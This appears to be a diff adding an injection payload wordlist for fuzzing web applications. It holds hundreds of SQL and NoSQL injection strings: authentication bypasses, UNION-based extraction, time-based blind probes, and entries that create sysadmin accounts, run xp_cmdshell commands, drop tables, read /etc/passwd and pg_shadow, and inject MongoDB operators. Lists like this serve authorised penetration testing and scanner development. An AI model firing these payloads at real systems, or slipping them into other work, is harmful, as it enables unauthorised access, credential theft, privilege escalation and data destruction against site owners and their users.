@@ -1,0 +1,368 @@
+#  This list we will using with SQL Injection the Stacked Queries  SQL Injection type ( The section follows the SQL Injection)
+#
+==
+=
+'
+' --
+' #
+' –
+'--
+'/*
+'#
+" --
+" #
+"/*
+' and 1='1
+' and a='a
+ or 1=1
+ or true
+' or ''='
+" or ""="
+1′) and '1′='1–
+' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
+" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
+ and 1=1
+ and 1=1–
+' and 'one'='one
+' and 'one'='one–
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+ like '%'
+ or 0=0 --
+ or 0=0 #
+ or 0=0 –
+' or         0=0 #
+' or 0=0 --
+' or 0=0 #
+' or 0=0 –
+" or 0=0 --
+" or 0=0 #
+" or 0=0 –
+%' or '0'='0
+ or 1=1--
+ or 1=1/*
+ or 1=1#
+ or 1=1–
+' or 1=1--
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'/*
+' or '1'='1'#
+' or '1′='1
+' or 1=1
+' or 1=1 --
+' or 1=1 –
+' or 1=1;#
+' or 1=1/*
+' or 1=1#
+' or 1=1–
+') or '1'='1
+') or '1'='1--
+') or '1'='1'--
+') or '1'='1'/*
+') or '1'='1'#
+') or ('1'='1
+') or ('1'='1--
+') or ('1'='1'--
+') or ('1'='1'/*
+') or ('1'='1'#
+'or'1=1
+'or'1=1′
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or 1=1
+" or 1=1 --
+" or 1=1 –
+" or 1=1--
+" or 1=1/*
+" or 1=1#
+" or 1=1–
+") or "1"="1
+") or "1"="1"--
+") or "1"="1"/*
+") or "1"="1"#
+") or ("1"="1
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("1"="1"#
+) or '1′='1–
+) or ('1′='1–
+' or 1=1 LIMIT 1;#
+'or 1=1 or ''='
+"or 1=1 or ""="
+' or 'a'='a
+' or a=a--
+' or a=a–
+') or ('a'='a
+" or "a"="a
+") or ("a"="a
+') or ('a'='a and hi") or ("a"="a
+' or 'one'='one
+' or 'one'='one–
+' or uid like '%
+' or uname like '%
+' or userid like '%
+' or user like '%
+' or username like '%
+' or 'x'='x
+') or ('x'='x
+" or "x"="x
+' OR 'x'='x'#;
+'=' 'or' and '=' 'or'
+' UNION ALL SELECT 1, @@version;#
+' UNION ALL SELECT system_user(),user();#
+' UNION select table_schema,table_name FROM information_Schema.tables;#
+admin' and substring(password/text(),1,1)='7
+' and substring(password/text(),1,1)='7
+' or 1=1 limit 1 -- -+
+'="or'
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+'create user name identified by 'pass123' --
+'create user name identified by pass123 temporary tablespace temp default tablespace users; 
+' ; drop table temp --
+'exec sp_addlogin 'name' , 'password' --
+' exec sp_addsrvrolemember 'name' , 'sysadmin' --
+' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
+' grant connect to name; grant resource to name; --
+' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+' union (select @@version) --
+' union (select NULL, (select @@version)) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+1' and 1=(select count(*) from tablenames); --
+select version();	
+select current_database();
+select current_user;
+select session_user;
+select current_setting('log_connections');
+select current_setting('log_statement');
+select current_setting('port');
+select current_setting('password_encryption');
+select current_setting('krb_server_keyfile');
+select current_setting('virtual_host');
+select current_setting('config_file');
+select current_setting('hba_file');
+select current_setting('data_directory');
+select * from pg_shadow;
+select * from pg_group;
+create table myfile (input TEXT);
+copy myfile from '/etc/passwd'; 
+select * from myfile;copy myfile to /tmp/test;
+# from wapiti
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+||pg_sleep(5)--
+1||pg_sleep(5)--
+"||pg_sleep(5)--
+'||pg_sleep(5)--
+1)||pg_sleep(5)--
+")||pg_sleep(5)--
+')||pg_sleep(5)--
+1))||pg_sleep(5)--
+"))||pg_sleep(5)--
+'))||pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+'\"
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+' AnD SLEEP(5) ANd '1
+'&&SLEEP(5)&&'1
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+'
++ SLEEP(10) + '
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or "
+-- or # 
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+ OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+'''''''''''''UNION SELECT '2
+%00
+/*…*/ 
++		addition, concatenate (or space in url)
+||		(double pipe) concatenate
+%		wildcard attribute indicator
+@variable	local variable
+@@variable	global variable
+# Numeric
+AND 1
+AND 0
+AND true
+AND false
+1-false
+1-true
+1*56
+-2
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' ORDER BY 1,2--+
+1' ORDER BY 1,2,3--+
+1' GROUP BY 1,2,--+
+1' GROUP BY 1,2,3--+
+' GROUP BY columnnames having 1=1 --
+-1' UNION SELECT 1,2,3--+
+' UNION SELECT sum(columnname ) from tablename --
+-1 UNION SELECT 1 INTO @,@
+-1 UNION SELECT 1 INTO @,@,@
+1 AND (SELECT * FROM Users) = 1	
+' AND MID(VERSION(),1,1) = '5';
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+Finding the table name
+Time-Based:
+,(select * from (select(sleep(10)))a)
+%2c(select%20*%20from%20(select(sleep(10)))a)
+';WAITFOR DELAY '0:0:30'--
+Comments:
+#	    Hash comment
+/*  	C-style comment
+-- -	SQL comment
+;%00	Nullbyte
+`	    Backtick
+select versionnumber, version_timestamp from sysibm.sysversions;
+select user from sysibm.sysdummy1;
+select session_user from sysibm.sysdummy1;
+select system_user from sysibm.sysdummy1;
+select current server from sysibm.sysdummy1;
+select name from sysibm.systables;
+select grantee from syscat.dbauth;
+select * from syscat.tabauth;
+select * from syscat.dbauth where grantee = current user;
+select * from syscat.tabauth where grantee = current user;
+select name, tbname, coltype from sysibm.syscolumns;
+SELECT schemaname FROM syscat.schemata;
+# mysql local file disclosure through sqli
+# fuzz interesting absolute filepath/filename into <filepath>
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+# info disclosure payload fuzzfile for pgsql
+copy myfile from '/etc/passwd';
+# you will need to customize/modify some of the vaules in the queries for best effect
+'create user name identified by pass123 temporary tablespace temp default tablespace users;
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+' || 'a'=='a
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+{$gt: ''}
+{"$gt": ""}
+[$ne]=1
+';sleep(5000);
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+{$nin: [""]}}
